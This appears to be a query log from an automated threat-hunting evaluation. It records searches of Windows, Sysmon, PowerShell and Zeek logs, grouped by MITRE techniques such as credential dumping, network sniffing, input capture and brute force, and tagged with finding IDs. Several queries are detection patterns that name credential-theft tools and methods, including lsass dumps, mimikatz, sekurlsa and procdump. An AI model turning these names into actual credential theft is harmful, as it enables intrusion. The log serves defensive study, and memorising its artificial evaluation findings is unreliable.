| q-630e531cb3 | triage T1003 step 1 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.ObjectName", "win.ProcessName", "win.AccessMask", "win.SubjectUserName", "win.Sub… | 13 |  |
| q-f4f42f8ed7 | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None | F01 |
| q-9351daaef3 | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None | F01 |
| q-2001f9df8f | triage T1003 step 2 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*Dump* OR win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*sekurlsa*)", "time_from": null, "time_to": … | 3 |  |
| q-641c9b14b3 | triage T1003 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None | F01, F02 |
| q-b3a5424840 | triage T1003 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Get-Process* OR win.ScriptBlockText:*OpenProcess* OR win.ScriptBlockText:*MiniDumpWriteDump* OR win.ScriptBlockText:*procdump* OR win.ScriptBlockText:*Invoke-Exfil* OR win.Sc… | 7 | F02 |
| q-e552a5e9be | triage T1003 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*dump* OR process.command_line:*procdump* OR process.command_line:*comsvcs* OR process.command_line:*minidump*)", "time_from": null, "time_to": null,… | 1 |  |
| q-c708b0f072 | triage T1003 step 4 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None | F04, F06 |
| q-e8162d103d | triage T1003 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*OfficeSupplies* OR win.TargetFilename:*psversion* OR win.TargetFilename:*SysinternalsSuite* OR win.TargetFilename:*.7z)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 314 | F01, F02 |
| q-3d8dcefc55 | triage T1003 step 4 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "win.ObjectName", "win.ProcessName", "win.AccessMask", "win.SubjectUserN… | 6 | F01, F07 |
| q-e7c1d57f4c | triage T1003 step 5 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.SubjectUserName:pbeesly", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "win.ObjectName", "win.ProcessName", "win.AccessMask", "win.Subject… | 2066 | F02, F03, F05 |
| q-177adcf2a0 | triage T1003 step 5 | search | {"dataset": "windows.security", "query": "event.code:4673 AND win.SubjectUserName:pbeesly", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "win.ObjectName", "win.ProcessName", "win.PrivilegeList", "win.Subj… | 600 | F03 |
| q-c40388dfc2 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-0f264ff6f2 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-c17ef6845e | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-6c4eebc346 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-58769bf263 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo57"} | None |  |
| q-630d9af4d1 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-8c652cb06e | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-3304f9ff29 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpVlTKv"} | None |  |
| q-6c4e096a2d | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz5hds0"} | None |  |
| q-fb4187c9e7 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYpu"} | None |  |
| q-fca905dbb8 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwBj58r"} | None |  |
| q-b44843f134 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMctHN"} | None |  |
| q-654199b85b | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-e2e29f7e09 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-0100379410 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBMV"} | None |  |
| q-6e88d2b6c5 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM_"} | None |  |
| q-718501cd93 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwwWlFq"} | None |  |
| q-8a9aedc31a | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-7ff6530c82 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-c269a66aa3 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-48fe7b8faf | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwxYBM3"} | None |  |
| q-25dff6f7d6 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwhC87m"} | None |  |
| q-a74833cc1c | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwqOo54"} | None |  |
| q-b7b088105e | triage T1040 step 1 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*pktmon* OR process.command_line:*netsh* OR process.command_line:*windump* OR process.command_line:*tcpdump* OR process.command_line:*rawcap* OR process.command_line:*Wireshark… | 2 | F08 |
| q-88a3382650 | triage T1040 step 1 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.ServiceName", "win.ImagePath", "win.ServiceType", "win.StartType", "win.AccountName", "message"], "size": 10, "sort": "asc"} | 5 | F09 |
| q-e42bfe3441 | triage T1040 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*javamtsup* OR process.executable:*javamtsup* OR process.command_line:*pcap* OR process.command_line:*npcap* OR process.command_line:*dumpcap* OR process.command_line:*windump* OR p… | 1 |  |
| q-fcf5a9a4a8 | triage T1040 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*netsh* OR process.command_line:*trace*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.… | 4 | F08 |
| q-423a3ab62a | triage T1040 step 3 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-ce373ffe97 | triage T1040 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*pcap* OR win.TargetFilename:*javamtsup* OR win.TargetFilename:*.etl)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "… | 40 | F09 |
| q-848203875c | triage T1040 step 4 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Sysinternals* OR win.ScriptBlockText:*javamtsup* OR win.ScriptBlockText:*Invoke-WebRequest* OR win.ScriptBlockText:*DownloadFile* OR win.ScriptBlockText:*Net.WebClient*)", "t… | 6 | F09 |
| q-1fe22616dc | triage T1040 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*SysinternalsSuite*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.TargetFilename"], "size… | 311 |  |
| q-fb5685ca28 | triage T1040 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*pktmon* OR process.executable:*dumpcap* OR process.executable:*windump* OR process.executable:*rawcap* OR process.executable:*Wireshark* OR process.executable:*tcpdump* OR process.ex… | 0 |  |
| q-841b16f02b | triage T1040 step 5 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 613 |  |
| q-ef3f39dc69 | triage T1040 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchIttyFQcI"} | None | F09 |
| q-75a395735e | triage T1040 step 6 | search | {"dataset": "zeek", "query": "event.action:notice OR event.action:weird OR destination.port:1234", "time_from": null, "time_to": null, "fields": ["@timestamp", "event.action", "source.ip", "destination.ip", "destination.port", "zeek.note", "zeek.msg", "zeek.se… | 15 | F10 |
| q-db1d8aafc7 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-74a5629567 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsU5KNV"} | None |  |
| q-e96a8f2534 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS3MUJ"} | None |  |
| q-b154c3a9f6 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkYcTxy"} | None |  |
| q-1a44c48240 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpo7P8B"} | None |  |
| q-449564a87b | triage T1040 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-4e6fcf8a4b | triage T1040 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWXW"} | None |  |
| q-38faff4d98 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpMcdEH"} | None |  |
| q-ea6a5cdaaf | triage T1040 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwHp5Zy"} | None |  |
| q-3c8b01f0e7 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchIttyFQcI"} | None |  |
| q-37a3778952 | triage T1040 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylrovu"} | None |  |
| q-22abe39320 | triage T1040 verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHpH1uOFchItylr4ug"} | None |  |
| q-c37e97e3f1 | triage T1056 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None | F11 |
| q-858a69835c | triage T1056 step 1 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjoor"} | None | F11 |
| q-dd8f1f5f88 | triage T1056 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.SourceImage:*powershell* OR win.SourceImage:*wsmprovhost*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.SourceImage", "w… | 3 | F14 |
| q-67b3806e60 | triage T1056 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None | F14 |
| q-8c9a793722 | triage T1056 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 AND (TO_LOWER(win.ScriptBlockText) LIKE \"*screenshot*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*copyfromscreen*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*getcre… | ERROR |  |
| q-61f8e0fec9 | triage T1056 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND (TO_LOWER(process.command_line) LIKE \"*screenshot*\" OR TO_LOWER(process.command_line) LIKE \"*keylog*\" OR TO_LOWER(process.command_line) LIKE \"*hook*\" OR TO_LOWE… | ERROR |  |
| q-a9c671088e | triage T1056 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*screenshot*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*copyfromscreen*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*ge… | 5 |  |
| q-43b356b348 | triage T1056 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*screenshot*\" OR TO_LOWER(process.command_line) LIKE \"*keylog*\" OR TO_LOWER(process.command_line) LIKE \"*hook*\" OR TO_… | 1 |  |
| q-efdee1ceab | triage T1056 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz_h1K2"} | None | F11 |
| q-619323aa60 | triage T1056 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopc"} | None | F11 |
| q-edec55922e | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-360b715486 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjYrA"} | None |  |
| q-b3a48e8886 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjoor"} | None |  |
| q-e333fa6c99 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwAjopc"} | None |  |
| q-2c6e32bca4 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHo31uOFchItz_h1K2"} | None |  |
| q-066e3b325c | triage T1056 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWX1"} | None |  |
| q-f9c7cdc384 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWWO"} | None |  |
| q-928c5aee7d | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-9eea6c9f51 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpLb9km"} | None |  |
| q-55040508d2 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-a617d49447 | triage T1056 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-bf0bf74605 | triage T1110 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)", "time_from": null, "time… | 9 | F15, F17 |
| q-10d9eaab35 | triage T1110 step 1 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "win.TargetUserName", "win.SubjectUserName", "win.TargetServerName", "win.LogonType", "process.executable", "win.IpAddress"], … | 15 | F16, F18, F19 |
| q-aeedd35b76 | triage T1110 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-851920824a | triage T1110 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*PowerShell.exe", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "process.parent.executable", "user.name", "win… | 0 |  |
| q-d4dcd7d86c | triage T1110 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND (process.pid == 2976 OR process.parent.pid == 2976 OR win.ProcessId == 2976) \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.e… | ERROR |  |
| q-843ae3844f | triage T1110 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == 1 AND TO_LOWER(process.command_line) LIKE \"*lsass*\" OR (event.code == 1 AND TO_LOWER(process.command_line) LIKE \"*invoke-mimikatz*\") OR (event.code == 1 AND TO_LOWER(pr… | ERROR |  |
| q-d9265d192c | triage T1110 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.pid == \"2976\" OR process.parent.pid == \"2976\" OR win.ProcessId == \"2976\") \| KEEP @timestamp, host.name, process.executable, process.command_line, … | ERROR |  |
| q-6e884a0ddb | triage T1110 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*lsass*\" OR TO_LOWER(process.command_line) LIKE \"*mimikatz*\" OR TO_LOWER(process.command_line) LIKE \"*sekurlsa*\" OR TO… | 1 |  |
| q-415bf61ca0 | triage T1110 step 5 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (process.pid == 2976 OR process.parent.pid == 2976) \| KEEP @timestamp, host.name, process.executable, process.command_line, process.parent.executable, process.pa… | 5 | F15 |
| q-7f51621c67 | triage T1110 step 6 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-2ca17a6258 | triage T1110 step 6 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:SAM", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ObjectName", "win.ObjectType", "process.executable", "win.SubjectUserName", "win.Acc… | 0 |  |
| q-9e0c04802b | triage T1110 step 7 | search | {"dataset": "windows.security", "query": "win.ObjectName:SAM", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ObjectName", "win.ObjectType", "process.executable", "win.SubjectUserName", "win.AccessMask", "win.Acces… | 10 | F17 |
| q-512c6aaf40 | triage T1110 step 7 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": "source.ip"} | 297 |  |
| q-13d687bd3c | triage T1110 step 8 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 30, "sub_field": "host.name"} | 297 |  |
| q-56ac5587de | triage T1110 step 8 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*PsExec64.exe OR process.executable:*PSEXESVC.exe OR process.executable:*sdelete64.exe OR process.executable:*python.exe)", "time_from": null, "time_to": null, "fields": ["@timestamp"… | 19 | F15, F18 |
| q-54f240796e | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-45fa8fea81 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-7959a67129 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgwo_a"} | None |  |
| q-d92dc9d0cd | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2r93"} | None |  |
| q-5dfc76da65 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-5b0de2434d | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-8dc31c6bfa | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-fd63b05e49 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-4bf0e5db56 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-be1e3c7d16 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsS38Vi"} | None |  |
| q-4f489f9c65 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjE0ff"} | None |  |
| q-eff2b38ea7 | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItwjFEcw"} | None |  |
| q-8a302398bc | triage T1110 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItku2b9g"} | None |  |
| q-b991c4986a | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-3a6d22213a | triage T1110 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHo31uOFchItsO1YsM"} | None |  |
| q-da001bc1ee | triage T1111 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (process.executable:*powershell* OR process.executable:*wsmprovhost* OR process.executable:*wininit* OR process.executable:*csrss* OR process.executable:*services*)", "time_f… | 7 |  |
| q-72b775d6dd | triage T1111 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)", "time_from": null, "time… | 9 | F20 |
| q-2ac73498c7 | triage T1111 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None | F20 |
| q-ca2ff0485e | triage T1111 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3G"} | None |  |
| q-e7fbe4ec00 | triage T1111 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None | F20 |
| q-622159fb16 | triage T1111 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:scranton.dmevals.local AND (process.command_line:*lsass* OR process.command_line:*MiniDump* OR process.command_line:*sekurlsa* OR process.command_line:*procdump* OR process.command_line:*comsvc… | 1 |  |
| q-2b97ab92ae | triage T1111 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*procdump* OR win.ScriptBlockText:*comsvcs* OR win.ScriptBlockText:*MFA* OR … | 1 |  |
| q-63a9b98bec | triage T1111 step 4 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkCwA"} | None | F20 |
| q-7058a0b6c7 | triage T1111 step 5 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND host.name:scranton.dmevals.local AND user.name:pbeesly", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.Path", "win.ScriptBlockText", "event.code"], "s… | 146 |  |
| q-28ce3bce03 | triage T1111 step 5 | search | {"dataset": "windows.sysmon", "query": "(registry.path:*Credential* OR registry.path:*SmartCard* OR registry.path:*Ngc* OR registry.path:*MFA* OR registry.path:*Wbio* OR win.TargetFilename:*smartcard* OR win.TargetFilename:*Credential*) AND host.name:scranton.… | 131 | F20 |
| q-161608c772 | triage T1111 step 6 | search | {"dataset": "windows.security", "query": "host.name:scranton.dmevals.local AND (win.TargetUserName:pbeesly OR user.name:pbeesly) AND event.code:(4624 OR 4672 OR 4648 OR 4673 OR 4663)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "… | 2231 |  |
| q-96693884a3 | triage T1111 step 6 | search | {"dataset": "windows.other", "query": "event.code:(7045 OR 7040 OR 2004 OR 2006 OR 5857 OR 5858 OR 5860 OR 10148 OR 10149 OR 20523)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "user.name", "message", "win.ServiceNa… | 109 |  |
| q-3e23277693 | triage T1111 step 7 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND (process.executable:*victim* OR process.command_line:*victim* OR win.TargetFilename:*victim* OR process.parent.executable:*victim*)", "time_from": null, "time_to": null, "fields": ["@… | 101 |  |
| q-7e149a85b3 | triage T1111 step 7 | search | {"dataset": "windows.security", "query": "host.name:scranton.dmevals.local AND win.ProcessName:*victim*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "user.name", "win.ProcessName", "win.ObjectName", "win.AccessMask"… | 6 |  |
| q-6c5aa1d11d | triage T1111 step 8 | search | {"dataset": "windows.sysmon", "query": "host.name:scranton.dmevals.local AND event.code:10 AND win.TargetImage:*lsass* AND process.executable:*powershell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "process.execut… | 2 |  |
| q-47d992fa72 | triage T1111 step 8 | search | {"dataset": "windows.sysmon", "query": "(win.TargetFilename:*MultiFactor* OR win.TargetFilename:*MFA* OR win.TargetFilename:*Ngc* OR win.TargetFilename:*Wbio* OR win.TargetFilename:*PhoneFactor* OR win.ImageLoaded:*MultiFactor* OR win.ImageLoaded:*PhoneFactor*… | 0 |  |
| q-243e68733d | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAt"} | None |  |
| q-0973a7cb6e | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpq9JAu"} | None |  |
| q-4ab113e004 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItkw4a_B"} | None |  |
| q-8b29eed092 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-7b9c5b00d1 | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpCQr3J"} | None |  |
| q-2c875d12ac | triage T1111 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHpH1uOFchItwCkCwA"} | None |  |
| q-5f7cb8050b | triage T1111 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpk0gjm"} | None |  |
| q-3a70ed2533 | triage T1187 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND win.TargetFilename:*StartUp*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.TargetFilename", "win.Image", "wi… | 1 |  |
| q-87b3398653 | triage T1187 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:3 AND (destination.port:139 OR destination.port:445)", "time_from": null, "time_to": null, "size": 30, "sub_field": "host.name"} | 66 |  |
| q-04522e62ed | triage T1187 step 1 | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHo31uOFchItyZYWW2"} | None | F21 |
